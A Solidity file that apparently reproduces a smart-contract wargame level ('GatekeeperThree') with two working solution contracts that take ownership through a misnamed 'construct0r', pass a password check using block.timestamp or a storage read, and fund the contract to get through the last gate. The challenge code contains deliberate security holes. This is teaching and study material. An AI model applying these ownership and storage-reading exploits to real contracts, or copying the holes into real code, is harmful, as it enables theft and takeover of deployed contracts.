// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint private password = block.timestamp;

    constructor (address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive () external payable {}
}

contract GatekeeperThreeSolution1 {
    constructor() payable {}

    function solve(address _gatekeeper) external {
        GatekeeperThree gatekeeper = GatekeeperThree(payable(_gatekeeper));

        // Solve gateOne
        gatekeeper.construct0r(); // Sets owner to this contract

        // Solve gateTwo: trick create Trick contract and resolve password in the same block -> same block.timestamp
        gatekeeper.createTrick();
        gatekeeper.getAllowance(block.timestamp); // Sets allow_enterance to true

        // Solve gateThree
        // Forwards this contract's balance to gatekeeper. Must be at least 0.001 ETH
        (bool success, ) = payable(address(gatekeeper)).call{
        value: address(this).balance
        }("");
        require(success, "Transfer failed.");

        // Completes the problem
        gatekeeper.enter();
    }
}

contract GatekeeperThreeSolution2 {
    constructor() payable {}
    function prepare(address _gatekeeper) external {
        GatekeeperThree gatekeeper = GatekeeperThree(payable(_gatekeeper));
        // Solve gateOne
        gatekeeper.construct0r(); // Sets owner to this contract

        // Solve gateTwo
        gatekeeper.createTrick();
    }
    function solve(address _gatekeeper, uint _password) external {
        GatekeeperThree gatekeeper = GatekeeperThree(payable(_gatekeeper));

        // Check Trick contract and get password by reading storage
        // await web3.eth.getStorageAt('SimpleTrick contract address', 2)
        gatekeeper.getAllowance(_password); // Sets allow_enterance to true

        // Solve gateThree
        // Forwards this contract's balance to gatekeeper. Must be at least 0.001 ETH
        (bool success, ) = payable(address(gatekeeper)).call{
        value: address(this).balance
        }("");
        require(success, "Transfer failed.");

        // Completes the problem
        gatekeeper.enter();
    }
}